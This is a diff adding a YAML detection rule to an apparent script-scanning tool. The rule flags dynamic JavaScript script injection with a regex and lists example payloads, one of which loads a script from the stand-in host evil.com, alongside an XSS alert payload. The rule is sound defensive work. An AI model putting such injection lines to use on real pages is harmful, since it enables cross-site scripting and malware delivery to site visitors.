@@ -1,0 +1,32 @@
+# JavaScript Pattern: Dynamic Script Loading
+# Detects dynamic script injection patterns
+
+id: JS-002
+name: Dynamic Script Loading
+description: |
+  Detects patterns where JavaScript dynamically creates and loads script elements,
+  often used to inject malicious code into web pages. This includes createElement
+  with 'script' tags and innerHTML/outerHTML assignments containing script tags.
+  Common in XSS attacks and malicious browser extensions.
+languages:
+  - javascript
+detection_type: regex
+detection_logic: '(?:createElement\s*\(\s*["'']script["'']|\.innerHTML\s*=.*<script|\.outerHTML\s*=.*<script|document\.write\s*\(.*<script)'
+severity: High
+mitre_technique: T1059.007
+confidence: 0.85
+category: code_injection
+enabled: true
+metadata:
+  author: Script Sentinel Team
+  created: "2025-01-15"
+  references:
+    - "https://attack.mitre.org/techniques/T1059/007/"
+  tags:
+    - javascript
+    - xss
+    - dynamic-loading
+  examples:
+    - "var s = document.createElement('script'); s.src = 'http://evil.com/malware.js'"
+    - "element.innerHTML = '<script>alert(1)</script>'"
+    - "document.write('<script src=\"malicious.js\"></script>')"
